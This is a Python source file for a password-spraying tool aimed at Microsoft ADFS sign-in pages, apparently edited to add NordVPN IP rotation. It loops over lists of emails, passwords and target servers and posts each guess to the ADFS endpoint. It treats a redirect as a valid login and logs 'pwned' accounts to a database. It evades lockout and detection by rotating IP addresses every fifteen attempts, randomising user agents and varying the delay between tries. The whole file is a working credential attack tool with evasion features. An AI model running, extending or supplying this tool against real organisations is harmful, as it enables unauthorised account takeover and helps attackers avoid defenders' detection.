# Adding vpn option to the following script
# Python3 tool to perform password spraying attack against ADFS
# by @xFreed0m

import argparse
import datetime
import sys
import time
import urllib
import urllib.parse
import requests
from nordvpn_switcher import initialize_VPN,terminate_VPN
from utils import configure_logger, make_session, random_time, userlist, passwordlist, targetlist, safe_rotate_vpn, get_public_ip, excptn, init_db, log_event, has_user_password_been_tested, has_user_been_pwned
from requests.packages.urllib3.exceptions import InsecureRequestWarning, TimeoutError
from requests_ntlm import HttpNtlmAuth


def logo():
    """
        ___    ____  ___________
       /   |  / __ \/ ____/ ___/____  _________ ___  __
      / /| | / / / / /_   \__ \/ __ \/ ___/ __ `/ / / /
     / ___ |/ /_/ / __/  ___/ / /_/ / /  / /_/ / /_/ /
    /_/  |_/_____/_/    /____/ .___/_/   \__,_/\__, /
                            /_/               /____/
    \n
    By @x_Freed0m\n
    [!!!] Remember! This tool is reliable as much as the target authentication response is reliable.\n
    Therefore, false-positive will happen more often that we would like.
    """


def args_parse():
    parser = argparse.ArgumentParser()
    pass_group = parser.add_mutually_exclusive_group(required=True)
    user_group = parser.add_mutually_exclusive_group(required=True)
    target_group = parser.add_mutually_exclusive_group(required=True)
    sleep_group = parser.add_mutually_exclusive_group(required=False)
    user_group.add_argument('-U', '--userlist', help="emails list to use, one email per line")
    user_group.add_argument('-u', '--user', help="Single email to test")
    pass_group.add_argument('-p', '--password', help="Single password to test")
    pass_group.add_argument('-P', '--passwordlist', help="Password list to test, one password per line")
    pass_group.add_argument("--userAsPass", action=argparse.BooleanOptionalAction, help="Use username as password")
    target_group.add_argument('-T', '--targetlist', help="Targets list to use, one target per line")
    target_group.add_argument('-t', '--target', help="Target server to authenticate against")
    sleep_group.add_argument('-s', '--sleep', type=int, help="Throttle the attempts to one attempt every # seconds, can be randomized by passing the value 'random' - default is 0", default=0)
    sleep_group.add_argument('-r', '--random', nargs=2, type=int, metavar=('minimum_sleep', 'maximum_sleep'), help="Randomize the time between each authentication attempt. Please provide minimum and maximum values in seconds")
    parser.add_argument('method', choices=['adfs', 'autodiscover', 'basicauth'])
    parser.add_argument('-v', '--verbose', help="Turn on verbosity to show failed attempts", action="store_true", default=False)    
    parser.add_argument("--vpn", action=argparse.BooleanOptionalAction, help="Use nord vpn to rotate IP")
    parser.add_argument('--skip-tested', action='store_true', help="Skip user:password already tried and logged in the DB")
    parser.add_argument('--ignore-success', action='store_true', help="Skip user already pwned in the DB")
    parser.add_argument("--vpn-area", default="Europe", help="VPN Zone(s) to use (ex: --vpn-area France,Germany,Netherlands,United Kingdom). Défaut: Europe.")
    return parser.parse_args()


def adfs_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, max_sleep, vpn, area, initial_ip, skip_tested, ignore_success, userAsPass):
    working_creds_counter = 0  # zeroing the counter of working creds before starting to count
    username_counter = 0
    prev_ip = initial_ip
    total_attempts = len(usernames) * len(usernames if userAsPass else passwords) * len(targets)

    try:
        LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
        for target in targets:  # checking each target separately
            for username in usernames:
                if (userAsPass):
                        passwords = [username.split('@')[0]]
                for password in passwords:  # trying one password against each user, less likely to lockout users
                    if ignore_success:
                        try:
                            already = has_user_been_pwned(username)
                        except Exception as e:
                            LOGGER.warning(f"[DB] Error during the user pwned check: {e}")
                            already = False  # en cas d'erreur, on choisit de ne pas bloquer le flux
                        if already:
                            LOGGER.info(f"[SKIP] {username} already pwned — skipping.")
                            continue
                    
                    if skip_tested:
                        try:
                            already = has_user_password_been_tested(username, password)
                        except Exception as e:
                            LOGGER.warning(f"[DB] Error during the user:password check: {e}")
                            already = False  # en cas d'erreur, on choisit de ne pas bloquer le flux
                        if already:
                            LOGGER.info(f"[SKIP] {username}:{password} already tested — skipping.")
                            continue  # passe au suivant

                    if vpn and username_counter % 15 == 0:
                        new_ip = safe_rotate_vpn(area, prev_ip=prev_ip, rotate_retries=4)
                        if new_ip:
                            prev_ip = new_ip
                            LOGGER.debug(f"[VPN] Using IP {prev_ip}")
                        else:
                            LOGGER.warning("[VPN] Rotation failed — exiting")
                            sys.exit(1)

                    ip = get_public_ip(timeout=5, retries=2)

                    target_url = "%s/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn%%3afederation" \
                                 "%%3aMicrosoftOnline&wctx=cbcxt=&username=%s&mkt=&lc=" % (target, username)
                    post_data = urllib.parse.urlencode({'UserName': username, 'Password': password,
                                                        'AuthMethod': 'FormsAuthentication'}).encode('ascii')
                    session = make_session(random_ua=True)
                    session.auth = (username, password)
                    
                    try:
                        response = session.post(target_url, data=post_data, allow_redirects=False,
                                            headers={'Content-Type': 'application/x-www-form-urlencoded',
                                                     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, '
                                                               'image/webp,*/*;q=0.8'})
                        sent_headers = response.request.headers
                        LOGGER.debug(f"Sent headers: {sent_headers}")
                        status_code = response.status_code
                        #  Currently checking only if working or not, need to add more tests in the future

                        if status_code == 302:
                            log_event(subject=username, password=password, target=target, status="success", ip=ip, details="")
                            working_creds_counter += 1
                            LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
                        else:
                            log_event(subject=username, password=password, target=target, status="fail", ip=ip, details="")
                            LOGGER.debug("[-]Creds failed for: %s" % username)
                        session.close()
                    except requests.exceptions.RequestException as e:
                        LOGGER.warning(f"Request failed for {username}@{target_url}: {e}")
                    
                    if random is True:  # let's wait between attempts
                        sleep_time = random_time(min_sleep, max_sleep)
                        time.sleep(float(sleep_time))
                    else:
                        time.sleep(float(sleep_time))
                    username_counter += 1
                    LOGGER.info(f"{username_counter} of {total_attempts} users tested")

        LOGGER.info("[*] Overall compromised accounts: %s" % working_creds_counter)
        LOGGER.info("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))

    except TimeoutError:
        LOGGER.critical("[!] Timeout! check if target is accessible")
        pass

    except KeyboardInterrupt:
        LOGGER.critical("[CTRL+C] Stopping the tool")
        exit(1)

    except Exception as e:
        excptn(e)


def main():
    args = args_parse()
    random = False
    min_sleep, max_sleep = 0, 0
    usernames, passwords, targets = [], [], []
    global LOGGER
    LOGGER = configure_logger(args.verbose, "ADFS")
    init_db("events.db")

    if args.userlist:
        try:
            usernames = userlist(args.userlist)
        except Exception as err:
            excptn(err)
    elif args.user:
        try:
            usernames = [args.user]
        except Exception as err:
            excptn(err)
    if args.password:
        try:
            passwords = [args.password]
        except Exception as err:
            excptn(err)
    elif args.passwordlist:
        try:
            passwords = passwordlist(args.passwordlist)
        except Exception as err:
            excptn(err)

    if args.target:
        try:
            targets = [args.target]
        except Exception as err:
            excptn(err)
    elif args.targetlist:
        try:
            targets = targetlist(args.targetlist)
        except Exception as err:
            excptn(err)
    if args.random:
        random = True
        min_sleep = args.random[0]
        max_sleep = args.random[1]

    total_accounts = len(usernames)
    total_passwords = len(usernames if args.userAsPass else passwords)
    total_targets = len(targets)
    total_attempts = total_accounts * total_passwords * total_targets
    LOGGER.info("Total number of users to test: %s" % str(total_accounts))
    LOGGER.info("Total number of passwords to test: %s" % str(total_passwords))
    LOGGER.info("Total number of targets to test: %s" % str(total_passwords))
    LOGGER.info("Total number of attempts: %s" % str(total_attempts))
    LOGGER.info("Now spraying ADFS.")
    LOGGER.info(f"Current date and time: {time.ctime()}")

    initial_ip = get_public_ip(timeout=5, retries=2)
    area = args.vpn_area or "Europe"

    if args.vpn:
        try:
            initialize_VPN(save=1, area_input=[area])
            LOGGER.debug(f"[VPN] initialized VPN on: {area} region(s)")
        except Exception as e:
            LOGGER.warning(f"[VPN] initialize_VPN failed at start: {e}")

        # --- NEW: capture initial IP and exit if unavailable ---
        initial_ip = get_public_ip(timeout=5, retries=2)
        if not initial_ip:
            LOGGER.critical("[VPN] Could not determine initial public IP after VPN init. Exiting.")
            try:
                terminate_VPN()
            except Exception as e:
                LOGGER.warning(f"[VPN] terminate_VPN failed while exiting: {e}")
            sys.exit(1)
        else:
            LOGGER.info(f"[VPN] Initial public IP: {initial_ip}")


    if args.method == 'adfs':
        LOGGER.info("[*] You chose %s method" % args.method)
        adfs_attempts(usernames, passwords, targets,
                      args.sleep, random, min_sleep, max_sleep, args.vpn, area, initial_ip, args.skip_tested, args.ignore_success, args.userAsPass)

    else:
        LOGGER.critical("[!] Please choose a method (autodiscover or adfs)")
    
    if args.vpn:
        terminate_VPN()

if __name__ == "__main__":
    main()

# TODO:
# check if target accessible with shorter timeout
# check other web responses to identify expired password, mfa, no such username, locked etc.
# auto discover the autodiscover?
# implement domain\user support
